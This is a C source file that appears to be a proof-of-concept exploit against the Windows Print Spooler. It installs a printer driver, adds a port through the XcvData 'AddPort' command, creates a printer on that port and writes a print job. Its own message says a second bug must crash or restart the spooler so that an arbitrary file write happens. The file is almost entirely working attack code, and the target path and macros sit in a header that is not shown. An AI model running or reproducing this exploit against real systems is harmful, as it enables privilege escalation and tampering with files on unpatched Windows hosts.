#include <Windows.h>
#include <stdio.h>

#include "src.h"

int main(void)
{
    HANDLE              hMonitor = NULL, hPrinter = NULL;
    PRINTER_DEFAULTS    printerDefaults = { 0 };
    BOOL                openSuccess = FALSE, addPortSuccess = FALSE;
    HRESULT             installSuccess;

    printerDefaults.pDatatype = NULL;
    printerDefaults.pDevMode = NULL;
    printerDefaults.DesiredAccess = SERVER_ACCESS_ADMINISTER;

    installSuccess = InstallPrinterDriverW(DRIVER_NAME);
    if (!SUCCEEDED(installSuccess)) {
        err("InstallPrinterDriverFromPackageW fail");
        goto out;
    }

    openSuccess = OpenPrinter(MONITOR_NAME, &hMonitor, &printerDefaults);
    if (!openSuccess) {
        err("OpenPrinter fail");
        goto out;
    }

    addPortSuccess = XcvCommandW(hMonitor, L"AddPort", PORT_NAME);
    if (!addPortSuccess) {
        err("XcvData add port fail");
        goto out;
    }

    hPrinter = CreatePrinterW(PORT_NAME, DRIVER_NAME, PRINTER_NAME);
    if (!hPrinter) {
        err("AddPrinterW fail");
        goto out;
    }

    PrintBuffer(hPrinter, "Helqwqlo!", strlen("Helqwqlo!"));

    puts("[+] All good, use another bug to crash the spooler svc/restart machine for file write to occur.");

    getchar();

out:
    if (hPrinter) {
        DeletePrinter(hPrinter);
        ClosePrinter(hPrinter);
    }
    if (addPortSuccess)
        XcvCommandW(hMonitor, L"DeletePort", PORT_NAME);
    if (openSuccess)
        ClosePrinter(hMonitor);
    if (SUCCEEDED(installSuccess))
        DeletePrinterDriverW(NULL, NULL, DRIVER_NAME);

    return 0;
}

void DisplayPortMonitorsW(void)
{
    MONITOR_INFO_1W buf[30] = { 0 };
    DWORD           needed, ret;
    
    EnumMonitorsW(NULL, 1, &buf, sizeof(buf), &needed, &ret);
    
    for (DWORD i = 0; i < 30; i++)
        wprintf(L"%s\n", buf[i].pName);

    return;
}

BOOL XcvCommandW(HANDLE hMonitor, LPCWSTR Cmd, LPCWSTR Data)
{
    DWORD dwNeeded, dwStatus;

    dwNeeded = ((DWORD)wcslen(Data) + 1) * sizeof(WCHAR);

    return XcvDataW(
        hMonitor,
        Cmd,
        Data,
        dwNeeded,
        NULL,
        0,
        &dwNeeded,
        &dwStatus
    );
}

HRESULT InstallPrinterDriverW(LPCWSTR DriverName)
{
    HRESULT res;

    res = InstallPrinterDriverFromPackageW(
        NULL,
        NULL,
        DriverName,
        NULL,
        0
    );
    
    return res;
}

HANDLE CreatePrinterW(LPCWSTR PortName, LPCWSTR DriverName, LPCWSTR PrinterName)
{
    PRINTER_INFO_2W printerInfo = { 0 };

    printerInfo.pPortName = PortName;
    printerInfo.pDriverName = DriverName;
    printerInfo.pPrinterName = PrinterName;
    printerInfo.pPrintProcessor = L"WinPrint";
    printerInfo.pDatatype = L"RAW";

    return AddPrinterW(NULL, 2, (LPBYTE)&printerInfo);
}

void PrintBuffer(HANDLE hPrinter, PBYTE Buf, DWORD cbLength)
{
    DOC_INFO_1W docInfo = { 0 };
    DWORD       dwNeeded;

    docInfo.pDatatype = L"RAW";
    docInfo.pOutputFile = NULL;
    docInfo.pDocName = L"Test";

    StartDocPrinterW(hPrinter, 1, &docInfo);
    WritePrinter(hPrinter, Buf, cbLength, &dwNeeded);
    EndDocPrinter(hPrinter);

    return;
}